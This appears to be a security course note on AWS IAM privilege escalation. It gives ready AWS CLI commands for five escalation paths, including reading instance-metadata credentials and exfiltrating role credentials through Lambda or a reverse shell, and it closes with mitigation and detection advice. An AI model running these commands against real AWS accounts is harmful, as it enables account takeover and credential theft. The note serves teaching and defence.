---
tags: [aws, iam, privilege-escalation, cloud, security]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.12 AWS IAM Esc"
---

# AWS IAM Privilege Escalation

## 1. Introduction to AWS IAM
AWS Identity and Access Management (IAM) is the heart of AWS security. It dictates who can access what resources under which conditions. The framework is incredibly granular and complex, utilizing Users, Groups, Roles, and Policies (managed and inline).

Because IAM allows for self-referential permissions (the ability to modify permissions, create users, or assume other identities), a slight misconfiguration in a policy can allow a low-privileged user to escalate their access to full Account Administrator. The security research firm Rhino Security Labs has famously cataloged over 21 distinct methods of AWS IAM Privilege Escalation.

## 2. Core Concepts of Privilege Escalation
Privilege escalation in AWS generally falls into a few categories:
1. **Direct Privilege Escalation**: A user has permissions to modify their own IAM policy or attach an administrator policy to themselves.
2. **Indirect Privilege Escalation (PassRole)**: A user has permissions to pass a highly privileged IAM Role to a compute service (like EC2 or Lambda) and then execute code on that service, thereby inheriting the role's permissions.
3. **Credential Creation**: A user has permissions to create new access keys for existing administrators or create login profiles.
4. **AssumeRole Abuse**: A user can assume a role that has higher privileges, often due to overly broad Trust Policies.

## 3. Top Attack Vectors and Exploitation Walkthroughs

### 3.1 Vector 1: `iam:CreatePolicyVersion`
When an IAM policy is updated, AWS creates a new "version" of it and sets it as the default. If a user has the `iam:CreatePolicyVersion` permission for a policy attached to themselves, they can write a new version granting `*.*` access.

**Exploitation:**
```bash
# 1. Create a JSON file (admin-policy.json) with full admin rights:
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}

# 2. Update the policy attached to the user:
aws iam create-policy-version \
    --policy-arn arn:aws:iam::123456789012:policy/LowPrivPolicy \
    --policy-document file://admin-policy.json \
    --set-as-default
```
*Result:* The user immediately gains full Administrator access.

### 3.2 Vector 2: `iam:PassRole` and `ec2:RunInstances`
This is the most famous indirect escalation path. If an attacker can launch an EC2 instance and attach an existing IAM role to it (`iam:PassRole`), they can log into the instance and extract the role's credentials from the IMDS (Instance Metadata Service).

**Prerequisites:** User has `ec2:RunInstances` and `iam:PassRole`.

**Exploitation:**
1. The attacker creates a user data script (`script.sh`) that establishes a reverse shell.
2. The attacker launches an EC2 instance, passing the target Administrator role:
```bash
aws ec2 run-instances \
    --image-id ami-0abcdef1234567890 \
    --instance-type t2.micro \
    --iam-instance-profile Name="AdminRoleProfile" \
    --user-data file://script.sh
```
3. Once the instance boots, the reverse shell connects back to the attacker.
4. The attacker queries the metadata service from within the EC2 instance to steal the Admin temporary credentials:
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRoleProfile
```
5. The attacker configures their local CLI with these credentials and owns the account.

### 3.3 Vector 3: `iam:PassRole` and `lambda:CreateFunction`
Similar to EC2, but using AWS Lambda. If a user can create a Lambda function and pass a role to it, they can write a function that executes privileged actions or sends the credentials back to them.

**Prerequisites:** User has `lambda:CreateFunction`, `lambda:InvokeFunction`, and `iam:PassRole`.

**Exploitation:**
1. Create a Lambda function deployment package (`lambda_function.zip`) containing Python code that reads environment variables (AWS credentials) and HTTP POSTs them to an attacker-controlled server.
2. Deploy the function, passing the target Admin role:
```bash
aws lambda create-function \
    --function-name ExfilCreds \
    --runtime python3.9 \
    --role arn:aws:iam::123456789012:role/AdminRole \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://lambda_function.zip
```
3. Invoke the function:
```bash
aws lambda invoke --function-name ExfilCreds output.txt
```
4. Check the attacker server logs to retrieve the Admin credentials.

### 3.4 Vector 4: `iam:CreateAccessKey`
If a user has permissions to generate access keys for *other* users, they can simply target an existing Admin user and create a set of keys for them.
*Note: AWS limits access keys to 2 per user. If the Admin already has 2, the attacker must delete one first (`iam:DeleteAccessKey`), which is very noisy.*

**Exploitation:**
```bash
aws iam create-access-key --user-name Administrator
```

### 3.5 Vector 5: `iam:PutUserPolicy` / `iam:AttachUserPolicy`
This allows a user to attach existing managed policies (like `AdministratorAccess`) or inject inline policies directly onto their own IAM user.

**Exploitation:**
```bash
aws iam attach-user-policy \
    --user-name AttackerUser \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## 4. Attack Flow and Visual Architecture (PassRole to EC2)

```text
+-----------------------------------------------------------------------------------+
|  AWS Environment                                                                  |
|                                                                                   |
|  +-----------------------+                                                        |
|  | Compromised IAM User  |  Permissions: ec2:RunInstances, iam:PassRole           |
|  | "DevUser"             |                                                        |
|  +-----------+-----------+                                                        |
|              |                                                                    |
|              | 1. aws ec2 run-instances --iam-instance-profile AdminRole          |
|              v                                                                    |
|  +-----------------------+                                                        |
|  | EC2 Service           |  2. Provisions instance and attaches AdminRole         |
|  +-----------+-----------+                                                        |
|              |                                                                    |
|              | 3. Boots Instance                                                  |
|              v                                                                    |
|  +-----------------------+      4. HTTP GET http://169.254.169.254/latest/...     |
|  | Malicious EC2 Instance| -------------------------------------------------+     |
|  | (Runs attacker's      |                                                  |     |
|  |  reverse shell)       | <------------------------------------------------+     |
|  +-----------+-----------+      5. Returns STS Credentials for AdminRole          |
|              |                                                                    |
|              | 6. Reverse shell sends credentials to Attacker                     |
|              v                                                                    |
|  +-----------------------+                                                        |
|  | Attacker C2 Server    |  -> Gains Full AWS Account Compromise                  |
|  +-----------------------+                                                        |
+-----------------------------------------------------------------------------------+
```

## 5. Tooling and Automation
Manually enumerating permissions to find these specific escalation paths is tedious. Attackers use automated tools to map the IAM graph and identify paths to Administrator.

### 5.1 Pacu
Pacu, the AWS exploitation framework by Rhino Security Labs, has a module specifically for identifying and exploiting these vectors:
```bash
# Run the enumeration module
run iam__privesc_scan

# If an escalation path is found, exploit it
run iam__privesc_scan --exploit
```

### 5.2 AWSPrivEsc
A standalone script that evaluates effective IAM policies to highlight precise escalation paths.

### 5.3 BloodHound (CloudHound / AzureHound)
While traditionally used for Active Directory, adaptations of BloodHound logic exist for mapping AWS IAM trust relationships and permissions to find paths to high-privileged roles.

## 6. Mitigation and Remediation

### 6.1 Principle of Least Privilege
Never attach broad policies (`Action: iam:*`) to users or roles unless they are dedicated IAM administrators.

### 6.2 Restrict `iam:PassRole`
The `iam:PassRole` permission is incredibly dangerous. It must be heavily restricted using the `Resource` block to ensure a user can only pass specific, low-privileged roles, NOT the `AdministratorAccess` role.
```json
{
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::123456789012:role/SpecificAppRole"
}
```

### 6.3 Permissions Boundaries
AWS introduced Permissions Boundaries to solve this exact problem. A permissions boundary sets the maximum permissions an identity can have. Even if a user escalates their privileges and grants themselves `AdministratorAccess`, the effective permissions are the intersection of the policy and the boundary. If the boundary does not allow administrative actions, the escalation fails.

### 6.4 Enforce IMDSv2
To prevent attackers from easily extracting credentials from the EC2 instance metadata service (as seen in the PassRole attack), enforce IMDSv2, which requires session tokens via HTTP PUT requests, mitigating simple SSRF and user-data exfiltration techniques.

## 7. Detection and Monitoring

### 7.1 CloudTrail Alerts
Create specific alerts (via CloudWatch or an external SIEM) for highly sensitive IAM API calls:
- `CreateAccessKey` (especially for accounts other than the caller).
- `AttachUserPolicy`, `PutUserPolicy`, `CreatePolicyVersion`.
- `UpdateAssumeRolePolicy` (modifying trust relationships).

### 7.2 AWS IAM Access Analyzer
Access Analyzer uses automated reasoning to verify that resource policies do not grant unintended public or cross-account access. It helps identify overly permissive Trust Policies that could lead to AssumeRole abuse.

## 8. Chaining Opportunities
- **[[08 - AWS RDS — Publicly Exposed Databases]]**: Extracting static IAM keys from an exposed database, then using those keys to run privilege escalation checks.
- **[[10 - AWS API Gateway — Authorization Bypass]]**: Bypassing API Gateway to hit a backend Lambda that has an overly permissive IAM role, allowing the attacker to escalate privileges via the Lambda's execution environment.
- **[[02 - SSRF in Cloud Environments]]**: Using SSRF on an EC2 instance to steal the attached role's credentials, which happens to have permissions to attach IAM policies, leading directly to account takeover.

## 9. Related Notes
- [[13 - GCP IAM — Service Account Key Abuse]]
- [[15 - Serverless Security (AWS Lambda)]]
- [[03 - Secrets Management in Cloud]]
